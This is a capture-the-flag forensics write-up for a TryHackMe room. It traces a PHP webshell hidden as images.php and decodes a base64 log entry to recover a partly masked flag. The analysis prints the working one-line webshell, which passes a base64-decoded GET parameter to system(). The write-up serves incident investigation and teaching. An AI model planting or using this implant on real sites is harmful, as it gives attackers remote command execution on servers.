---
title: Infinity Shell
summary: TryHackMe webshell forensics room investigating a PHP implant, tracing attacker query strings, and decoding a base64 payload to recover the flag.
date: 2026-07-01
tags: [TryHackMe, Forensics, Webshell, PHP, Base64, Log Analysis]
difficulty: easy
os: Linux
url: https://tryhackme.com/room/hfb1infinityshell
---

# CTF Room: Infinity Shell
- [Link to room](https://tryhackme.com/room/hfb1infinityshell)
- **Difficulty:** Easy
- **Category:** Web Forensics, Webshell Analysis, Log Analysis
- **OS:** Linux

## 1. Brief
Infinity Shell is a TryHackMe forensics room focused on tracing activity from an implanted webshell.

The prompt mentioned a compromised web application, so I started with the common web root and looked for suspicious uploaded PHP content.

## 2. Web Root Review
I moved into the web directory and found the application folder.

### Commands
```bash
cd /var/www/html
ls -la
cd CMSsite-master
```

Since webshells are often disguised as normal-looking PHP files, I started inspecting PHP files in the application directory.

## 3. Webshell Discovery
The suspicious file was `images.php`.

### Command
```bash
strings images.php
```

### Output
```php
<?php system(base64_decode($_GET['query'])); ?>
```

This is a simple PHP webshell. It takes the `query` GET parameter, base64-decodes it, and passes the decoded value into `system()`.

## 4. Tracing Webshell Usage
To find commands passed to the webshell, I searched for references to `images.php` and the `query` parameter.

### Commands
```bash
cat * | grep images.php
cat * | grep query
```

One base64 value stood out:

```text
||********************************************||
```

Decoding that value produced an `echo` command containing the flag.

### Decoded Command
```bash
echo '||THM{sup3r_34************||'
```

## 5. Flag

#### What is the flag?
### Answer
```text
||THM{sup3r_34************||
```

## 6. Summary
The attack used a lightweight PHP webshell in `images.php`.

The implant executed commands from the base64-decoded `query` parameter. Searching for previous `query` values revealed a suspicious base64 string, which decoded to an `echo` command containing the flag.
